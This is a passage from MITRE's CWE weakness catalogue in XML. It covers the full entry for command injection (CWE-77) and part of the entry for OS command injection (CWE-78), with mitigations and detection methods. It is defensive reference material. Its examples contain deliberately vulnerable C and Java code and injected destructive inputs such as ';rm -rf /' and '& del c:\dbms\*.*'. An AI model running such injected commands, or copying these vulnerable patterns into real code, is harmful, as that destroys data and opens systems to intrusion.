            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-09-09">Weak Password Recovery Mechanism</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="77" Name="Improper Neutralization of Special Elements used in a Command ('Command Injection')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Command injection vulnerabilities typically occur when:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>1. Data enters the application from an untrusted source.</xhtml:div>
               <xhtml:div>2. The data is part of a string that is executed as a command by the application.</xhtml:div>
               <xhtml:div>3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.</xhtml:div>
            </xhtml:div>
            <xhtml:p>Command injection is a common problem with wrapper programs.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>If a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If at all possible, use library calls rather than external processes to recreate the desired functionality.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If possible, ensure that all external commands called from the program are statically created.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Run time: Run time policy enforcement may be used in a whitelist fashion to prevent use of any non-sanctioned commands.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Assign permissions to the software system that prevents the user from accessing/opening privileged files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-28">
               <Intro_Text>The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String btype = request.getParameter("backuptype");<xhtml:br/>String cmd = new String("cmd.exe /K \"<xhtml:div style="margin-left:10px;">
                        <xhtml:div>c:\\util\\rmanDB.bat "<xhtml:br/>+btype+<xhtml:br/>"&amp;&amp;c:\\utl\\cleanup.bat\"")</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>System.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form "&amp; del c:\\dbms\\*.*", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String home = System.getProperty("APPHOME");<xhtml:br/>String cmd = home + INITCMD;<xhtml:br/>java.lang.Runtime.getRuntime().exec(cmd);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The code above allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a wrapper around the UNIX command cat which prints the contents of a file to standard out. It is also injectable:</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>#include &lt;stdio.h&gt;<xhtml:br/>#include &lt;unistd.h&gt;<xhtml:br/>
                     <xhtml:br/>int main(int argc, char **argv) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>char cat[] = "cat ";<xhtml:br/>char *command;<xhtml:br/>size_t commandLength;<xhtml:br/>
                           <xhtml:br/>commandLength = strlen(cat) + strlen(argv[1]) + 1;<xhtml:br/>command = (char *) malloc(commandLength);<xhtml:br/>strncpy(command, cat, commandLength);<xhtml:br/>strncat(command, argv[1], (commandLength - strlen(cat)) );<xhtml:br/>
                           <xhtml:br/>system(command);<xhtml:br/>return (0);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Used normally, the output is simply the contents of the file requested:</Body_Text>
               <Example_Code Nature="informative">
                  <xhtml:div>$ ./catWrapper Story.txt<xhtml:br/>When last we left our heroes...</xhtml:div>
               </Example_Code>
               <Body_Text>However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>$ ./catWrapper Story.txt; ls<xhtml:br/>When last we left our heroes...<xhtml:br/>Story.txt<xhtml:br/>SensitiveFile.txt<xhtml:br/>PrivateData.db<xhtml:br/>a.out*</xhtml:div>
               </Example_Code>
               <Body_Text>If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Command Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Command injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT Perl Secure Coding">
               <Entry_ID>IDS34-PL</Entry_ID>
               <Entry_Name>Do not pass untrusted, unsanitized data to a command interpreter</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="11"/>
            <Related_Attack_Pattern CAPEC_ID="136"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="23"/>
            <Related_Attack_Pattern CAPEC_ID="248"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="6"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 10: Command Injection.&#34; Page 171"/>
         </References>
         <Notes>
            <Note Type="Terminology">
               <xhtml:p>The "command injection" phrase carries different meanings to different people. For some people, it refers to refers to any type of attack that can allow the attacker to execute commands of their own choosing, regardless of how those commands are inserted. The command injection could thus be resultant from another weakness. This usage also includes cases in which the functionality allows the user to specify an entire command, which is then executed; within CWE, this situation might be better regarded as an authorization problem (since an attacker should not be able to specify arbitrary commands.)</xhtml:p>
               <xhtml:p>Another common usage, which includes CWE-77 and its descendants, involves cases in which the attacker injects separators into the command being constructed.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Other_Notes, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Other_Notes, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-04-11">Command Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Data into a Control Plane (aka 'Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Sanitize Data into a Control Plane ('Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in a Command ('Command Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="78" Name="Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>This could allow attackers to execute unexpected, dangerous commands directly on the operating system. This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage.</xhtml:p>
            <xhtml:p>There are at least two subtypes of OS command injection:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ol>
                  <xhtml:li>The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system("nslookup [HOSTNAME]") to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing.</xhtml:li>
                  <xhtml:li>The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use "exec([COMMAND])" to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line.</xhtml:li>
               </xhtml:ol>
            </xhtml:div>
            <xhtml:p>From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="88" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Shell injection</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Shell metacharacters</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Hide Activities</Impact>
               <Note>Attackers could execute unauthorized commands, which could then be used to disable the software, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
                  <xhtml:p>Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If at all possible, use library calls rather than external processes to recreate the desired functionality.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
